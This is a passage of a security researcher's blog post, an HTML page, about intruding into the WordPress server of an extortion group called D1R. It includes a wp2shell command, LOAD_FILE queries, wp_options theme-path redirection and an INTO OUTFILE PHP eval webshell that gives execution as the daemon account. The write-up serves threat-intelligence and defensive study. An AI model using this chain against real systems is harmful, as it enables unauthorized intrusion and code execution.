@@ -1,0 +1,440 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="description" content="A Synopsys breach alert led me to D1R’s own infrastructure, and from WordPress to exposed database access and a daemon shell. With Abdelhameed Ghazy’s help on the payload and RCE, I followed the evidence into deployment traces and blue-team findings."><meta name="generator" content="Astro v5.18.1"><link rel="canonical" href="https://xelessaway.me/blog/d1r-claimed-a-synopsys-breach-then-i-got-inside-its-server/"><!-- Open Graph / WhatsApp / Telegram / Discord / LinkedIn --><meta property="og:site_name" content="Ahmed Elessaway (xElessaway)"><meta property="og:title" content="D1R Claimed a Synopsys Breach. Then I Got Inside Its Server | Ahmed Elessaway (xElessaway)"><meta property="og:description" content="A Synopsys breach alert led me to D1R’s own infrastructure, and from WordPress to exposed database access and a daemon shell. With Abdelhameed Ghazy’s help on the payload and RCE, I followed the evidence into deployment traces and blue-team findings."><meta property="og:type" content="article"><meta property="og:url" content="https://xelessaway.me/blog/d1r-claimed-a-synopsys-breach-then-i-got-inside-its-server/"><meta property="og:image" content="https://xelessaway.me/logo-me.png"><meta property="og:image:secure_url" content="https://xelessaway.me/logo-me.png"><meta property="og:image:alt" content="D1R Claimed a Synopsys Breach. Then I Got Inside Its Server | Ahmed Elessaway (xElessaway)"><meta property="article:published_time" content="2026-11-16T00:00:00.000Z"><meta property="article:section" content="reports"><meta property="article:tag" content="threat-intelligence"><meta property="article:tag" content="dfir"><meta property="article:tag" content="d1r"><meta property="article:tag" content="wordpress"><meta property="article:tag" content="phpmyadmin"><meta property="article:tag" content="rce"><meta property="article:tag" content="infrastructure-analysis"><!-- Twitter / X Card --><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@ahmed_elessaway"><meta name="twitter:creator" content="@ahmed_elessaway"><meta name="twitter:title" content="D1R Claimed a Synopsys Breach. Then I Got Inside Its Server | Ahmed Elessaway (xElessaway)"><meta name="twitter:description" content="A Synopsys breach alert led me to D1R’s own infrastructure, and from WordPress to exposed database access and a daemon shell. With Abdelhameed Ghazy’s help on the payload and RCE, I followed the evidence into deployment traces and blue-team findings."><meta name="twitter:image" content="https://xelessaway.me/logo-me.png"><meta name="twitter:image:alt" content="D1R Claimed a Synopsys Breach. Then I Got Inside Its Server | Ahmed Elessaway (xElessaway)"><link rel="icon" type="image/png" href="/logo-me.png"><link rel="apple-touch-icon" href="/logo-me.png"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,400..800&family=Hanken+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200&display=block" rel="stylesheet"><script data-goatcounter="https://xelessaway.goatcounter.com/count" async src="https://gc.zgo.at/count.js"></script><script>
+      (() => {
+        const savedTheme = localStorage.getItem("theme");
+        const theme = savedTheme === "dark" ? "dark" : "light";
+        document.documentElement.setAttribute("data-theme", theme);
+      })();
+    </script><title>D1R Claimed a Synopsys Breach. Then I Got Inside Its Server | Ahmed Elessaway (xElessaway)</title><link rel="stylesheet" href="/_astro/about.DV9svIaW.css"></head> <body class="ops-root"> <a class="skip-link" href="#main-content">Skip to content</a> <header class="site-header"> <div class="shell-bar"> <div class="shell-left"> <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="site-nav"> <span class="sr-only">Toggle navigation</span> <span></span> </button> <a class="brand-mark" href="/" aria-label="Ahmed Elessaway home"> <img src="/logo-me.png" alt="Ahmed Elessaway" class="brand-avatar"> <span class="brand-copy"> <strong>xElessaway</strong> <small>research portfolio</small> </span> </a> </div> <nav id="site-nav" class="site-nav" aria-label="Primary navigation"> <a class="nav-link" href="/"> Home </a><a class="nav-link is-active" href="/blog/"> Research </a><a class="nav-link" href="/threat-intelligence/"> Threat Intel </a><a class="nav-link" href="/tools/"> Tools </a><a class="nav-link" href="/ctf/"> Practice </a><a class="nav-link" href="/about/"> Profile </a> </nav> <div class="shell-right-actions"> <button class="theme-toggle-btn" type="button" id="theme-toggle" aria-label="Toggle light and dark theme" title="Toggle Theme"> <!-- Moon Icon for Dark Mode --> <svg class="theme-svg theme-icon-moon" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path> </svg> <!-- Sun Icon for Light Mode --> <svg class="theme-svg theme-icon-sun" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <circle cx="12" cy="12" r="5"></circle> <line x1="12" y1="1" x2="12" y2="3"></line> <line x1="12" y1="21" x2="12" y2="23"></line> <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line> <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line> <line x1="1" y1="12" x2="3" y2="12"></line> <line x1="21" y1="12" x2="23" y2="12"></line> <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line> <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line> </svg> </button> <a class="header-contact" href="/about/#contact">Connect</a> </div> </div> </header> <script type="module">const c=document.querySelector(".menu-toggle"),e=document.querySelector("#site-nav"),s=window.matchMedia("(min-width: 1100px)");if(c instanceof HTMLButtonElement&&e instanceof HTMLElement){const o=()=>{e.classList.remove("is-open"),c.setAttribute("aria-expanded","false")},t=()=>{s.matches&&o()};c.addEventListener("click",()=>{const n=e.classList.toggle("is-open");c.setAttribute("aria-expanded",String(n))}),e.querySelectorAll("a").forEach(n=>{n.addEventListener("click",()=>{o()})}),document.addEventListener("click",n=>{const a=n.target;!s.matches&&e.classList.contains("is-open")&&a instanceof Node&&!e.contains(a)&&!c.contains(a)&&o()}),"addEventListener"in s&&s.addEventListener("change",t),t()}const i=document.getElementById("theme-toggle");i?.addEventListener("click",()=>{const t=(document.documentElement.getAttribute("data-theme")||"light")==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",t),localStorage.setItem("theme",t)});</script> <main id="main-content" class="page-main">  <div class="article-dossier-container"> <!-- Top Back Navigation Bar --> <nav class="article-breadcrumb-bar"> <a href="/blog/" class="article-back-link"> <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class aria-hidden="true"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg> <span>Back to Research Archive</span> </a> <span class="article-doc-id">DOC_ID: D1R-CLAIMED-A-SY</span> </nav> <!-- Article Header Card --> <header class="article-dossier-header"> <div class="article-tape-sticker" aria-hidden="true"></div> <div class="article-meta-ribbon"> <span class="article-type-pill">Intelligence Report</span> <span class="article-status-pill"> <span class="pulse-dot" aria-hidden="true"></span>
+VERIFIED ANALYSIS
+</span> </div> <h1 class="article-title">D1R Claimed a Synopsys Breach. Then I Got Inside Its Server</h1> <p class="article-lede">A Synopsys breach alert led me to D1R’s own infrastructure, and from WordPress to exposed database access and a daemon shell. With Abdelhameed Ghazy’s help on the payload and RCE, I followed the evidence into deployment traces and blue-team findings.</p> <div class="article-info-strip"> <div class="article-info-item"> <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class aria-hidden="true"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg> <time datetime="2026-11-16T00:00:00.000Z"> November 16, 2026 </time> </div> <div class="article-info-item"> <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class aria-hidden="true"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg> <span>25 min read</span> </div>  </div> <div class="article-tags-wrap"> <a href="/blog/#threat-intelligence" class="article-tag-chip">#threat-intelligence</a><a href="/blog/#dfir" class="article-tag-chip">#dfir</a><a href="/blog/#d1r" class="article-tag-chip">#d1r</a><a href="/blog/#wordpress" class="article-tag-chip">#wordpress</a><a href="/blog/#phpmyadmin" class="article-tag-chip">#phpmyadmin</a><a href="/blog/#rce" class="article-tag-chip">#rce</a><a href="/blog/#infrastructure-analysis" class="article-tag-chip">#infrastructure-analysis</a> </div> </header> <!-- Article Body / Manuscript --> <main class="article-manuscript-panel">  <div class="article-prose prose"> <p><strong>An alert about Synopsys brought me to D1R. Following the infrastructure took me from wp-admin to phpMyAdmin, and eventually to a daemon shell.</strong></p>
+<p><em>Investigation by Ahmed Elessaway. <a href="https://www.linkedin.com/in/abdelhameed-ghazy-1a50b619a/">Abdelhameed Ghazy</a> helped get the full RCE.</em></p>
+<h1 id="tldr">TL;DR</h1>
+<ul>
+<li>The investigation started from an alert claiming D1R had breached Synopsys and shifted to examining D1R’s own portal infrastructure rather than the breach claims themselves.</li>
+<li>The portal ran WordPress. The wp2shell route reached wp-admin, but that access gave no usable way to write files, so the dashboard alone was a dead end.</li>
+<li>An unauthenticated phpMyAdmin instance was exposed, running as a privileged MySQL account with the FILE privilege. That single misconfiguration carried the rest of the chain.</li>
+<li>LOAD_FILE read host files straight from the database session, including /etc/passwd, the Apache config, and wp-config.php (the database password plus all eight WordPress keys and salts, withheld here).</li>
+<li>The usual RCE routes were blocked. The application and system files were not writable, so editing theme files or uploading a plugin returned permission denied, and a wp_options cron deserialization POP chain came close but lacked a complete gadget set for this build. The route that worked wrote a PHP file to a writable temp path with SELECT … INTO OUTFILE and redirected the theme path in wp_options so WordPress included it, producing code execution as the daemon service account.</li>
+<li>Git configuration and session records then gave a deployment and access trail. No root escalation was proven, and the original breach, supply-chain, and ARM Athena DM leak claims are not independently authenticated here.</li>
+</ul>
+<p>The first lead was an alert claiming D1R had breached Synopsys. The more I read, the wider the claims got: a supply-chain angle, leaked ARM Athena DM material, Bosch-related data. I wanted to see how those claims connected, and what the infrastructure publishing them would reveal.</p>
+<p><img src="/images/posts/d1r-claimed-a-synopsys-breach-then-i-got-inside-its-server/image1.png" alt=""></p>
+<p><em>The D1R portal displaying Synopsys, Arm and Bosch. This capture comes from the later authenticated review, not the original alert or first visit.</em></p>
+<p>So I started looking at D1R’s own infrastructure. The portal lined up recognizable company names next to download controls, but the page alone couldn’t tell me how the material was obtained or whether the advertised datasets were real. I went after the technical trail behind the presentation.</p>
+<p>The portal ran WordPress. I looked at the wp2shell route and used it to reach wp-admin. That first win came with a limit: the access gave me no usable way to write files. Rather than treat the dashboard as the finish line, I kept going.</p>
+<p>The next find was phpMyAdmin. Its SQL interface gave me a different view of the application and a very different set of capabilities. An investigation that started with breach claims ended up producing host-file disclosure, exposed WordPress secrets, recorded code execution, and an infrastructure trail. Those breach and supply-chain claims stay separate, though, from what I could actually substantiate on the portal.</p>
+<h1 id="wp2shell-opened-wp-admin-and-the-first-route-stalled">wp2shell opened wp-admin and the first route stalled</h1>
+<p>Once it was clear the portal ran WordPress, I examined the wp2shell route, ran the utility, and landed in wp-admin. That was the initial access in this investigation. I’m not pinning it to a specific component or core CVE, though; an update banner and a tool’s success message aren’t strong enough evidence for that.</p>
+<p>For the initial-access record, this was the invocation I used. The onion target is redacted in this public version; the Tor routing and timeout options match the recorded command.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#E1E4E8">py wp2shell.py shell </span><span style="color:#9ECBFF">"[ONION_URL_REDACTED]"</span><span style="color:#F97583"> -</span><span style="color:#E1E4E8">i </span><span style="color:#F97583">--</span><span style="color:#E1E4E8">proxy socks5h:</span><span style="color:#F97583">//</span><span style="color:#79B8FF">127.0</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">0.1</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">9150</span><span style="color:#F97583"> --</span><span style="color:#E1E4E8">timeout </span><span style="color:#79B8FF">120</span></span></code></pre>
+<p><img src="/images/posts/d1r-claimed-a-synopsys-breach-then-i-got-inside-its-server/wp2shell-execution-redacted.png" alt="Recorded wp2shell terminal output with the onion target, webshell endpoint and generated credential redacted"></p>
+<p><em>The original terminal capture reports administrator creation and authentication. The onion target, webshell endpoint and generated credential are permanently redacted in this copy. The output also shows failed cleanup and HTTP 404, so this capture alone does not establish a working webshell or identify the underlying vulnerability. The dashboard screenshot below records the resulting wp-admin visibility.</em></p>
+<p><img src="/images/posts/d1r-claimed-a-synopsys-breach-then-i-got-inside-its-server/image2.png" alt=""></p>
+<p><em>The WordPress Users screen during authenticated review, showing the portal administrator and investigation-related accounts. It confirms dashboard visibility, not a specific exploit root cause.</em></p>
+<p>Reaching the dashboard didn’t hand me the write capability I needed. Seeing the admin panel is one thing; having a working path to write or run server-side content is another. With the first route stalled, I kept reviewing the environment and how the site was put together.</p>
+<p>The backend showed a familiar stack: WooCommerce, a “Timed Product for WooCommerce” plugin, victim-branded product entries, and a small media library. The account diradmin_leak001 sat there as an administrator, and one profile URL pointed at localhost:8000. That last detail looks like development residue, but it doesn’t prove where the original build lived.</p>
+<p>Digging further, I found a phpMyAdmin instance tied to the environment, and it opened with no login prompt at all. I went in and started working through the database. This was the point where I stopped being limited to whatever the WordPress dashboard chose to show me.</p>
+<p>The earlier write restriction wasn’t proof that the whole server was read-only. The database path that followed relied on a different capability and ran in a different context, which is exactly why a dead end in wp-admin could still be followed by progress through phpMyAdmin.</p>
+<p>Before I followed that database path, the material sitting in the portal was worth a look on its own. It explained what D1R was presenting as evidence for the claims that started this.</p>
+<h1 id="what-the-synopsys-evidence-actually-showed">What the Synopsys evidence actually showed</h1>
+<p>With backend access I could look at the material behind D1R’s claims. One artifact caught the Synopsys SolvNetPlus self-registration workflow: a terminal window sat over the browser, showing fetchmail activity, a returned verification-code value, and a site-ID prompt, while the browser showed a selected site entry associated with Sydney.</p>
+<p><img src="/images/posts/d1r-claimed-a-synopsys-breach-then-i-got-inside-its-server/image3.png" alt=""></p>
+<p><em>Actor-published material showing SolvNetPlus registration and terminal output. You can see the registration context and the claimed access, but not any successful internal compromise.</em></p>
+<p>That gave me a concrete workflow to examine: register, verify by email, select a site. What it didn’t show was the full authentication process, the privileges of any account that resulted, or access to a protected repository. One screenshot isn’t a breach narrative, and I didn’t treat it as one.</p>
+<p><img src="/images/posts/d1r-claimed-a-synopsys-breach-then-i-got-inside-its-server/image4.png" alt=""></p>
+<p><em>The WordPress media library showing nine items, including old_form, new_form, arm_sites, can, sample and brand images.</em></p>
+<p>The media library put that image in context. Registration-form captures sat next to Arm-related material, a Bosch-branded manual cover, a terminal-listing image, and logos, the portal’s published supporting material. It explained how the claim was staged. Filenames and thumbnails, on their own, can’t authenticate where the alleged stolen data came from or how complete it is.</p>
+<h1 id="the-database-boundary-did-not-hold">The database boundary did not hold</h1>
+<p>The phpMyAdmin instance needed no authentication. The SQL interface opened with no login prompt, and the session ran as a privileged MySQL account, the same privilege level the later FILE operations confirm. That unauthenticated, privileged database console was the misconfiguration everything downstream depended on. Inside, I worked through the WordPress database; the broader report records a wordpress.sql export of 2,171,228 bytes. The records were useful on their own, but the bigger development was that a query could also return local files from the database host.</p>
+<p>The query below targeted /opt/lampp/etc/httpd.conf, and the result screenshot shows ordinary Linux account records. The x in each record is a password placeholder, not a recovered password or a shadow-file hash.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line"><span style="color:#F97583">SELECT</span><span style="color:#79B8FF"> SUBSTRING</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#79B8FF">CONVERT</span><span style="color:#E1E4E8">(LOAD_FILE(</span><span style="color:#9ECBFF">'/opt/lampp/etc/httpd.conf'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">USING</span><span style="color:#E1E4E8"> utf8mb4),</span></span>
+<span class="line"><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">60000</span></span>
+<span class="line"><span style="color:#E1E4E8">) </span><span style="color:#F97583">AS</span><span style="color:#E1E4E8"> full;</span></span></code></pre>
+<p><img src="/images/posts/d1r-claimed-a-synopsys-breach-then-i-got-inside-its-server/image5.png" alt=""></p>
+<p><em>A separate screenshot shows an explicit LOAD_FILE query for /opt/lampp/etc/httpd.conf, with a successful result and returned Apache configuration text.</em></p>
+<p>This was server-side file disclosure through a privileged SQL session. LOAD_FILE is a normal database feature, so the finding is about what this deployment exposed and which files were readable under its effective permissions, not about a new phpMyAdmin bug.</p>
+<p>The scope was narrower than “read anything,” too. Database privileges, the service’s OS permissions, file-access policy, and size limits all still apply, and the wrapper asked for at most 60,000 characters after conversion. A visible excerpt proves content came back; it isn’t a full forensic copy of every byte.</p>
+<p>Even so, the impact mattered. The SQL session was reaching past tables and into the host’s configuration files. Once wp-config appeared in the evidence, file disclosure turned into secret exposure.</p>
+<h1 id="wp-config-exposed-the-secrets-behind-the-application">wp-config exposed the secrets behind the application</h1>
+<p>The wp-config.php transcript held the database name wordpress, the application username leakadmin001leak, a plaintext database password, and all eight WordPress authentication keys and salts. The host was localhost and the table prefix was wp_. I’m withholding the secret values.</p>
+<p><img src="/images/posts/d1r-claimed-a-synopsys-breach-then-i-got-inside-its-server/image6.png" alt=""></p>
+<p><em>The database account overview showing local root entries with ALL PRIVILEGES and Password: No. On its own, that doesn’t establish unauthenticated access from the public internet.</em></p>
+<p>The configuration also set WP_DEBUG to false and FS_METHOD to direct. Neither one changes the file-read picture: turning off debug output does nothing to stop SQL file reads, and while the direct filesystem method lets WordPress use PHP file operations, its presence alone doesn’t prove an attacker can write executable content.</p>
+<p>The exposed password needed rotation, and the keys and salts needed replacement with every session invalidated. Their disclosure weakened the protection around authentication material. I didn’t have evidence of a forged cookie or a login using that database credential, but a secret can be compromised well before anyone watches it being used.</p>
+<h1 id="the-bootstrap-file-needed-a-careful-reading">The bootstrap file needed a careful reading</h1>
+<p>I also read through the supplied wp-settings.php. It initializes WordPress, loads core libraries, handles conditional drop-ins and multisite setup, loads active plugins, and includes functions.php for active themes. All of that is routine bootstrap work.</p>
+<p>That point matters for the RCE discussion later. The mere presence of include and require statements doesn’t mean an attacker controls what gets included; what matters is the integrity of the content being loaded and the permissions around it. The bootstrap file by itself wasn’t evidence of another vulnerability.</p>
+<p>By now the scope had grown from database contents to files and application secrets. The next piece of evidence showed the investigation had also reached code execution.</p>
+<h1 id="what-the-host-looked-like-from-the-blue-team-side">What the host looked like from the blue-team side</h1>
+<p>I also pulled the system and service observations into a host profile. From a blue-team perspective, that turns scattered SQL results and readable configuration files into something useful for an investigation: a host to identify, services to inventory, paths to preserve, and identities to keep separate.</p>
+<p><img src="/images/posts/d1r-claimed-a-synopsys-breach-then-i-got-inside-its-server/host-os-release.png" alt=""></p>
+<p><em>The /etc/os-release result identifies Debian GNU/Linux 12 (Bookworm). This is the original embedded screenshot extracted from exhibit E07 on page 12 of the supplied consolidated assessment; the visible result is truncated.</em></p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Field</th><th>Observed value / source</th><th>Blue-team interpretation</th></tr></thead><tbody><tr><td>Hostname</td><td>vpserver01, from /etc/hostname and MariaDB @@hostname in the supplied observations</td><td>Useful for correlating host and database records; a hostname is not an operator identity.</td></tr><tr><td>Operating system</td><td>Debian GNU/Linux 12 (Bookworm); /etc/debian_version reported as 12.15 in the supplied configuration excerpt</td><td>Record the distribution and package state separately. The OS screenshot establishes Bookworm, not the full point-release value by itself.</td></tr><tr><td>Timezone</td><td>Etc/UTC, from /etc/timezone</td><td>A reference for the timeline. The timezone used by Apache’s timestamps still needs independent confirmation.</td></tr><tr><td>Architecture</td><td>x86_64, reported by the MariaDB build target</td><td>A build/platform observation, not proof of a vulnerable package.</td></tr><tr><td>Database</td><td>10.4.32-MariaDB / Source distribution</td><td>An observed version string for inventory; patch state needs package and advisory validation.</td></tr><tr><td>SQL execution identity</td><td>CURRENT_USER() = root@localhost</td><td>Database administrative identity. It does not establish Linux UID 0.</td></tr><tr><td>Installation base</td><td>/opt/lampp</td><td>Strong evidence of an XAMPP/LAMPP layout, corroborated by the supplied configuration.</td></tr><tr><td>Database storage</td><td>/opt/lampp/var/mysql/</td><td>A location for the database artifacts and relevant service logs, subject to the actual configuration.</td></tr><tr><td>Local DB socket</td><td>/opt/lampp/var/mysql/mysql.sock</td><td>A local connection endpoint; its presence says nothing about public reachability.</td></tr><tr><td>Configured DB TCP port</td><td>3306</td><td>A configured port, not proof that it is exposed through the host firewall or upstream network.</td></tr><tr><td>Server character set / collation</td><td>utf8mb4 / utf8mb4_general_ci</td><td>Context for interpreting query results and text conversion.</td></tr><tr><td>Logged web-stack banner</td><td>Apache 2.4.58; OpenSSL 1.1.1w; PHP 8.2.12; mod_perl 2.0.12; Perl 5.34.1</td><td>Describes the banner at the logged time, not independently verified current patch state.</td></tr><tr><td>Resolver and search suffix</td><td>1.1.1.1; initech.global</td><td>DNS configuration evidence. The search suffix does not prove domain ownership or organizational affiliation.</td></tr><tr><td>hosts file</td><td>127.0.0.1 mapped to localhost and vpserver01; ::1 mapped to localhost</td><td>Local name mappings to retain when interpreting loopback traffic and logs.</td></tr></tbody></table>
+<p><img src="/images/posts/d1r-claimed-a-synopsys-breach-then-i-got-inside-its-server/mariadb-platform-paths.png" alt=""></p>
+<p><em>Exhibit E06 on page 11 of the consolidated assessment shows Linux/x86_64 and the /opt/lampp installation, data and plugin paths. These are MariaDB query results; Linux root privileges are not established by them.</em></p>
+<p>The useful pattern here was the combination of a familiar LAMPP layout and different privilege boundaries. A root@localhost database session could coexist with denied writes to application directories and PHP executing as daemon. Those are separate identities and permissions, so I kept them separate in the host profile as well.</p>
+<p><em>Source context: these additions use the supplied system/configuration excerpt and host observations in the November 15 consolidated PDF, which labels itself an authorized CTF assessment. They are supplied evidence, not an independent live verification or external corroboration of actor attribution. Its earlier execution/callback conclusions do not replace the later evidence already described in this article.</em></p>
+<h1 id="account-names-became-useful-when-tied-to-activity">Account names became useful when tied to activity</h1>
+<p>The account list added context about the machine, but it needed the same discipline as the service inventory. A row in /etc/passwd can show an account and its configured shell. It cannot tell me that a service was running, that somebody logged in, or who controlled the account.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Account / indicator</th><th>Observed detail</th><th>Interpretation</th></tr></thead><tbody><tr><td>root</td><td>UID 0; /bin/bash</td><td>Standard local superuser account. Its presence is not evidence that the investigation reached root.</td></tr><tr><td>user</td><td>UID 1000; /bin/bash</td><td>Interactive account; human owner unknown. The session and SSH records discussed later provide the activity evidence.</td></tr><tr><td>mysql</td><td>UID 999; /bin/sh</td><td>Database-related service account with a shell configured. The account entry alone does not establish the active database process UID.</td></tr><tr><td>daemon</td><td>Later command output shows UID 1 and GID 1</td><td>The demonstrated PHP/OS execution context in this investigation, distinct from the database’s root@localhost session.</td></tr><tr><td>debian-tor</td><td>/bin/false</td><td>Tor package/service account present; the account alone does not establish a running onion service.</td></tr><tr><td>sshd / Debian-exim</td><td>/usr/sbin/nologin</td><td>SSH- and Exim-related accounts present; service and authentication logs are needed for activity claims.</td></tr><tr><td>x2gouser / x2goprint</td><td>/bin/false and /bin/sh</td><td>X2Go-related accounts present; no remote-desktop session or operator identity is established by those entries.</td></tr><tr><td>lightdm / pulse</td><td>Service accounts present</td><td>Desktop-login and audio components are suggested, not proof of an interactive desktop session.</td></tr></tbody></table>
+<p>The distinction also matters for credentials. /etc/passwd normally holds account metadata, with x indicating that password verification data is stored elsewhere. The account disclosure shown earlier was not a successful read of /etc/shadow or a recovery of usable password hashes.</p>
+<h1 id="the-rce-turning-point-was-a-daemon-shell">The RCE turning point was a daemon shell</h1>
+<p>From this point the work was a collaboration. The write capability the wp-admin route never gave us came from the database layer instead. The phpMyAdmin instance needed no authentication, and the MySQL account behind it held the FILE privilege, the same one the LOAD_FILE reads above already demonstrated. FILE works in both directions: LOAD_FILE reads host files, and SELECT … INTO OUTFILE writes attacker-chosen bytes to a path on the database host.</p>
+<p>Having a write primitive did not mean the usual WordPress RCE routes were open. The application and system paths were not writable by this account. Overwriting an existing theme file, editing functions.php in place, and dropping a new plugin all came back as permission denied, so the common approach of writing a webshell into the webroot was closed off from the start.</p>
+<p>We also spent time on a PHP object-injection path. The serialized cron entry in wp_options is unserialized whenever WordPress reads it, which makes it a deserialization sink, and we tried to build a POP chain through it. This WordPress build did not expose a complete, usable gadget set to finish the chain. It came close, close enough to be worth the attempt, but it never produced execution.</p>
+<p>The route that worked used WordPress’s own theme loading. WordPress builds the active theme’s path from the template and stylesheet values in wp_options and includes that directory’s functions.php on every request, and those values are never checked for path traversal. Pointing them at a relative path walked the theme root out of wp-content/themes and into a directory we controlled:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line"><span style="color:#F97583">UPDATE</span><span style="color:#E1E4E8"> wp_options </span><span style="color:#F97583">SET</span><span style="color:#E1E4E8"> option_value</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'../../../../../var/tmp'</span><span style="color:#F97583"> WHERE</span><span style="color:#E1E4E8"> option_name</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'template'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">UPDATE</span><span style="color:#E1E4E8"> wp_options </span><span style="color:#F97583">SET</span><span style="color:#E1E4E8"> option_value</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'../../../../../var/tmp'</span><span style="color:#F97583"> WHERE</span><span style="color:#E1E4E8"> option_name</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'stylesheet'</span><span style="color:#E1E4E8">;</span></span></code></pre>
+<p>With the theme root now resolving to /var/tmp, WordPress would include /var/tmp/functions.php. INTO OUTFILE supplied that file. A first write confirmed the include actually fired:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line"><span style="color:#F97583">SELECT</span><span style="color:#9ECBFF"> '&#x3C;?php var_dump(1); ?>'</span></span>
+<span class="line"><span style="color:#F97583">INTO</span><span style="color:#E1E4E8"> OUTFILE </span><span style="color:#9ECBFF">'/var/tmp/functions.php'</span><span style="color:#E1E4E8">;</span></span></code></pre>
+<p>Once the page echoed that marker, functions.php carried a minimal eval shell:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span><span style="color:#79B8FF"> var_dump</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">); </span><span style="color:#F97583">if</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">]){</span><span style="color:#79B8FF">eval</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">]);}</span><span style="color:#F97583">?></span></span></code></pre>
+<p>An earlier attempt under /tmp did not execute, while /var/tmp did. The whole chain lived in the database and the wp_options table, with no write to the web root itself.</p>
+<p>Unauthenticated phpMyAdmin → MySQL FILE privilege (SELECT … INTO OUTFILE to write, LOAD_FILE to read) → PHP-bearing file written to disk → wp_options theme-path redirection (template / stylesheet) → WordPress theme include → execution as daemon</p>
+<p><img src="/images/posts/d1r-claimed-a-synopsys-breach-then-i-got-inside-its-server/image7.png" alt=""></p>
+<p><em>The listener screenshot shows a shell returning daemon. The displayed peer is loopback, so that field doesn’t identify any remote public origin.</em></p>
+<p><img src="/images/posts/d1r-claimed-a-synopsys-breach-then-i-got-inside-its-server/image11.png" alt=""></p>
+<p><em>The eval shell reached through the browser. It returns int(1), the shell’s own marker, followed by uid=1(daemon) gid=1(daemon) groups=1(daemon),1000(user) from id. The command was passed base64-encoded (aWQ=) to clear WordPress input filtering.</em></p>
+<p>That output puts command execution in the daemon service account. It is not a root shell, and it does not show privilege escalation or a read of /etc/shadow.</p>
+<p>The exact write-and-load sequence is less fully recorded than the execution outcome. The supplied materials don’t capture every intermediate database result or the written file’s owner and mode. So we treat that sequence as the reported mechanism and the visible command output as the stronger evidence.</p>
+<p>Why /tmp failed while /var/tmp reportedly worked isn’t established by these artifacts. There’s also no final readback confirming that the theme and logging settings were restored or that the temporary PHP was removed. A note saying cleanup was done isn’t evidence that it was.</p>
+<p>Even without reaching for an unproven root-compromise claim, the consequence was serious: a remote execution endpoint and a shell running with the daemon account’s permissions. The next phase looked at what that environment gave up.</p>
+<h1 id="a-git-configuration-revealed-a-deployment-trail">A Git configuration revealed a deployment trail</h1>
